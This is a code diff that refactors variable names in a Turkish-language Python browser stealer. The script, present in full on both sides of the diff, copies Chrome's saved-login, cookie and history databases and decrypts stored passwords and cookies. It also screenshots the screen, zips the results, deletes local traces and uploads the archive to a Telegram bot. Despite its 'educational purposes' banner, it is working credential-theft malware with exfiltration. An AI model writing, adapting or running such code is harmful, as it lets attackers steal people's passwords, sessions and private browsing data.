@@ -1,28 +1,28 @@
-KullaniciAdi = os.getlogin()
-ChromeYolu = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\'
-AppData = os.getenv("APPDATA") + '\\'
+kullanici_adi = os.getlogin()
+chrome_yolu = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\'
+app_data = os.getenv("APPDATA") + '\\'
 
 def ChromePass():
-    if os.path.exists(ChromeYolu + 'Login Data'):
+    if os.path.exists(chrome_yolu + 'Login Data'):
         
         # DB'yi Kopyala
-        shutil.copy2(ChromeYolu + 'Login Data', AppData + '{}_LoginData.sql'.format(KullaniciAdi))
+        shutil.copy2(chrome_yolu + 'Login Data', app_data + f'{kullanici_adi}_LoginData.sql')
         
         # Veri Tabanı Bağlantısı
-        conn = sqlite3.connect(AppData + '{}_LoginData.sql'.format(KullaniciAdi))
+        conn = sqlite3.connect(app_data + f'{kullanici_adi}_LoginData.sql')
         cursor = conn.cursor()
         
         # Dosya Oluştur Başlık Gir
-        Banner = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + KullaniciAdi + ' İsimli Bilgisayarın\nChrome Tarayıcı Şifreleri\n\n'
-        file = open(AppData + '{}_ChromePass.txt'.format(KullaniciAdi), "w+") #
-        file.write(Banner)
+        ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı Şifreleri\n\n'
+        file = open(app_data + f'{kullanici_adi}_ChromePass.txt', "w+") #
+        file.write(ust_bilgi)
         file.close()
         
         # Sonuçları getir
-        GelenVeri = []
+        gelen_veri = []
         cursor.execute('SELECT signon_realm, username_value, password_value FROM logins')
         for result in cursor.fetchall():
-            # Login ve URL Kolonları
+            # Login ve url Kolonları
             login = result[1]
             url = result[0]
             
@@ -30,33 +30,33 @@ def ChromePass():
                 password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                 if login and url and password:
                     data = '='*100 + '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password +'\n' + '='*100
-                    GelenVeri.append(data)
+                    gelen_veri.append(data)
             except:
                 pass
         
-        for Sonuc in GelenVeri:
-            file = open(AppData + '{}_ChromePass.txt'.format(KullaniciAdi), "a+") #
-            file.write(Sonuc + '\n')
+        for sonuc in gelen_veri:
+            file = open(app_data + f'{kullanici_adi}_ChromePass.txt', "a+") #
+            file.write(sonuc + '\n')
             file.close()
 
 def ChromeCookies():
-    if os.path.exists(ChromeYolu + 'Cookies'):
+    if os.path.exists(chrome_yolu + 'Cookies'):
         
         # DB'yi Kopyala
-        shutil.copy2(ChromeYolu + 'Cookies', AppData + '{}_Cookies.sql'.format(KullaniciAdi))
+        shutil.copy2(chrome_yolu + 'Cookies', app_data + f'{kullanici_adi}_Cookies.sql')
         
         # Veri Tabanı Bağlantısı
-        conn = sqlite3.connect(AppData + '{}_Cookies.sql'.format(KullaniciAdi))
+        conn = sqlite3.connect(app_data + f'{kullanici_adi}_Cookies.sql')
         cursor = conn.cursor()
         
         # Dosya Oluştur Başlık Gir
-        Banner = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + KullaniciAdi + ' İsimli Bilgisayarın\nChrome Tarayıcı Çerezleri\n\n'
-        file = open(AppData + '{}_ChromeCookies.txt'.format(KullaniciAdi), "w+") #
-        file.write(Banner)
+        ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı Çerezleri\n\n'
+        file = open(app_data + f'{kullanici_adi}_ChromeCookies.txt', "w+") #
+        file.write(ust_bilgi)
         file.close()
         
         # Sonuçları getir
-        GelenVeri = []
+        gelen_veri = []
         cursor.execute('SELECT * from cookies')
         for result in cursor.fetchall():
             # url ve name Kolonları
@@ -67,93 +67,93 @@ def ChromeCookies():
                 cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
                 if url and name and cookie:
                     data = '='*100 + '\nURL: ' + url + '\nCOOKIE: ' + cookie + '\nCOOKIE NAME: ' + name +'\n' + '='*100
-                    GelenVeri.append(data)
+                    gelen_veri.append(data)
             except:
                 pass
         
-        for Sonuc in GelenVeri:
-            file = open(AppData + '{}_ChromeCookies.txt'.format(KullaniciAdi), "a+") #
-            file.write(Sonuc + '\n')
+        for sonuc in gelen_veri:
+            file = open(app_data + f'{kullanici_adi}_ChromeCookies.txt', "a+") #
+            file.write(sonuc + '\n')
             file.close()
 
 def ChromeDownloadHistory():
-    if os.path.exists(ChromeYolu + 'History'):
+    if os.path.exists(chrome_yolu + 'History'):
         
         # DB'yi Kopyala
-        shutil.copy2(ChromeYolu + 'History', AppData + '{}_History.sql'.format(KullaniciAdi))
+        shutil.copy2(chrome_yolu + 'History', app_data + f'{kullanici_adi}_History.sql')
         
         # Veri Tabanı Bağlantısı
-        conn = sqlite3.connect(AppData + '{}_History.sql'.format(KullaniciAdi))
+        conn = sqlite3.connect(app_data + f'{kullanici_adi}_History.sql')
         cursor = conn.cursor()
         
         # Dosya Oluştur Başlık Gir
-        Banner = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + KullaniciAdi + ' İsimli Bilgisayarın\nChrome Tarayıcı İndirme Geçmişi\n\n'
-        file = open(AppData + '{}_ChromeDownloadHistory.txt'.format(KullaniciAdi), "w+") #
-        file.write(Banner)
+        ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı İndirme Geçmişi\n\n'
+        file = open(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt', "w+") #
+        file.write(ust_bilgi)
         file.close()
         
         # Sonuçları getir
-        GelenVeri = []
+        gelen_veri = []
         cursor.execute('SELECT current_path, tab_url from downloads')
         for result in cursor.fetchall():
-            # Dizin ve URL Kolonları
-            Dizin = result[0]
-            URL = result[1]
+            # dizin ve url Kolonları
+            dizin = result[0]
+            url = result[1]
             
             try:
-                if Dizin and URL:
-                    data = '='*100 + '\nDizin: ' + Dizin + '\nURL: ' + URL +'\n' + '='*100
-                    GelenVeri.append(data)
+                if dizin and url:
+                    data = '='*100 + '\nDizin: ' + dizin + '\nURL: ' + url +'\n' + '='*100
+                    gelen_veri.append(data)
             except:
                 pass
         
-        for Sonuc in GelenVeri:
-            file = open(AppData + '{}_ChromeDownloadHistory.txt'.format(KullaniciAdi), "a+") #
-            file.write(Sonuc + '\n')
+        for sonuc in gelen_veri:
+            file = open(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt', "a+") #
+            file.write(sonuc + '\n')
             file.close()
 
 def ChromeURLHistory():
-    if os.path.exists(ChromeYolu + 'History'):
+    if os.path.exists(chrome_yolu + 'History'):
         
         # DB'yi Kopyala
-        shutil.copy2(ChromeYolu + 'History', AppData + '{}_History.sql'.format(KullaniciAdi))
+        shutil.copy2(chrome_yolu + 'History', app_data + f'{kullanici_adi}_History.sql')
         
         # Veri Tabanı Bağlantısı
-        conn = sqlite3.connect(AppData + '{}_History.sql'.format(KullaniciAdi))
+        conn = sqlite3.connect(app_data + f'{kullanici_adi}_History.sql')
         cursor = conn.cursor()
         
         # Dosya Oluştur Başlık Gir
-        Banner = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + KullaniciAdi + ' İsimli Bilgisayarın\nChrome Tarayıcı URL Geçmişi\n\n'
-        file = open(AppData + '{}_ChromeURLHistory.txt'.format(KullaniciAdi), "w+") #
-        file.write(Banner)
+        ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı url Geçmişi\n\n'
+        file = open(app_data + f'{kullanici_adi}_ChromeURLHistory.txt', "w+") #
+        file.write(ust_bilgi)
         file.close()
         
         # Sonuçları getir
-        GelenVeri = []
+        gelen_veri = []
         cursor.execute('SELECT title, url from urls')
         for result in cursor.fetchall():
-            # Baslik ve URL Kolonları
-            Baslik = result[0]
-            URL = result[1]
+            # baslik ve url Kolonları
+            baslik = result[0]
+            url = result[1]
             
             try:
-                if Baslik and URL:
-                    data = '='*100 + '\nBaşlık: ' + Baslik + '\nURL: ' + URL +'\n' + '='*100
-                    GelenVeri.append(data)
+                if baslik and url:
+                    data = '='*100 + '\nBaşlık: ' + baslik + '\nURL: ' + url +'\n' + '='*100
+                    gelen_veri.append(data)
             except:
                 pass
         
-        for Sonuc in GelenVeri:
+        for sonuc in gelen_veri:
             try:
-                file = open(AppData + '{}_ChromeURLHistory.txt'.format(KullaniciAdi), "a+") #
-                file.write(Sonuc + '\n')
+                file = open(app_data + f'{kullanici_adi}_ChromeURLHistory.txt', "a+") #
+                file.write(sonuc + '\n')
                 file.close()
             except:
                 pass
 
 def ScreenShot():
     screen = ImageGrab.grab()
-    screen.save(AppData + '{}_ScreenShot.jpg'.format(KullaniciAdi))
+    screen.save(app_data + f'{kullanici_adi}_ScreenShot.jpg')
 
 ChromePass()
 ChromeCookies()
@@ -162,30 +162,30 @@ ChromeURLHistory()
 ScreenShot()
 
 def ZipFile():
-    ZipName = AppData + '{}_LOG.zip'.format(KullaniciAdi)
-    YeniZip = zipfile.ZipFile(ZipName,'w')
-    YeniZip.write(AppData + '{}_ChromePass.txt'.format(KullaniciAdi))
-    YeniZip.write(AppData + '{}_ChromeCookies.txt'.format(KullaniciAdi))
-    YeniZip.write(AppData + '{}_ChromeDownloadHistory.txt'.format(KullaniciAdi))
-    YeniZip.write(AppData + '{}_ChromeURLHistory.txt'.format(KullaniciAdi))
-    YeniZip.write(AppData + '{}_ScreenShot.jpg'.format(KullaniciAdi))
-    YeniZip.close()
+    zip_adi = app_data + f'{kullanici_adi}_LOG.zip'
+    yeni_zip = zipfile.ZipFile(zip_adi,'w')
+    yeni_zip.write(app_data + f'{kullanici_adi}_ChromePass.txt')
+    yeni_zip.write(app_data + f'{kullanici_adi}_ChromeCookies.txt')
+    yeni_zip.write(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt')
+    yeni_zip.write(app_data + f'{kullanici_adi}_ChromeURLHistory.txt')
+    yeni_zip.write(app_data + f'{kullanici_adi}_ScreenShot.jpg')
+    yeni_zip.close()
 ZipFile()
 
 def imha():
-    os.remove(AppData + '{}_ChromePass.txt'.format(KullaniciAdi))
-    os.remove(AppData + '{}_ChromeCookies.txt'.format(KullaniciAdi))
-    os.remove(AppData + '{}_ChromeDownloadHistory.txt'.format(KullaniciAdi))
-    os.remove(AppData + '{}_ChromeURLHistory.txt'.format(KullaniciAdi))
-    os.remove(AppData + '{}_ScreenShot.jpg'.format(KullaniciAdi))
-    os.remove(AppData + '{}_LoginData.sql'.format(KullaniciAdi))
-    os.remove(AppData + '{}_Cookies.sql'.format(KullaniciAdi))
-    os.remove(AppData + '{}_History.sql'.format(KullaniciAdi))
+    os.remove(app_data + f'{kullanici_adi}_ChromePass.txt')
+    os.remove(app_data + f'{kullanici_adi}_ChromeCookies.txt')
+    os.remove(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt')
+    os.remove(app_data + f'{kullanici_adi}_ChromeURLHistory.txt')
+    os.remove(app_data + f'{kullanici_adi}_ScreenShot.jpg')
+    os.remove(app_data + f'{kullanici_adi}_LoginData.sql')
+    os.remove(app_data + f'{kullanici_adi}_Cookies.sql')
+    os.remove(app_data + f'{kullanici_adi}_History.sql')
 imha()
 
 def TelegramSend():
-    Loglar = {'document': open(AppData + '{}_LOG.zip'.format(KullaniciAdi), 'rb')}
-    requests.post("https://api.telegram.org/bot" + Bot_Token + "/sendDocument?chat_id=" + Chat_ID , files=Loglar)
+    loglar = {'document': open(app_data + f'{kullanici_adi}_LOG.zip', 'rb')}
+    requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=loglar)
 TelegramSend()
 
-os.remove(AppData + '{}_LOG.zip'.format(KullaniciAdi))
+os.remove(app_data + f'{kullanici_adi}_LOG.zip')
